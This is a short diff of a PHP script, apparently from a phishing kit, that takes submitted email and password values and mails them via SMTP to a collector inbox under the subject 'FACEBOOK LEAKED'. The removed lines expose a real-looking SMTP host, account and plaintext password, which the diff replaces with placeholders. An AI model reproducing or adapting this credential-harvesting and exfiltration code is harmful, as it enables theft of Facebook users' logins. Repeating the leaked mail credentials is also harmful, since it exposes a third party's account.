@@ -31,15 +31,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($email) && !empty($password))
     try {
         // Konfigurasi SMTP
         $mail->isSMTP();
-        $mail->Host       = 'kemiri.iixcp.rumahweb.net'; // SMTP Host Rumahweb
+        $mail->Host       = 'host'; // SMTP Host Rumahweb
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'kinara@topterpercaya.my.id'; // Email pengirim
-        $mail->Password   = 'Jakarta@1337'; // Password email pengirim
+        $mail->Username   = 'username@domain.com'; // Email pengirim
+        $mail->Password   = 'password'; // Password email pengirim
         $mail->SMTPSecure = 'ssl'; // SSL encryption
         $mail->Port       = 465; // Port untuk SSL
 
-        $mail->setFrom('kinara@topterpercaya.my.id', 'Kinara');
-        $mail->addAddress('spamming.karran@gmail.com'); // Ganti dengan alamat email tujuan
+        $mail->setFrom('namapengirim@gmail.com', 'Karran');
+        $mail->addAddress('emailtujuan@gmail.com'); // Ganti dengan alamat email tujuan
 
         $mail->isHTML(true);
         $mail->Subject = 'FACEBOOK LEAKED';
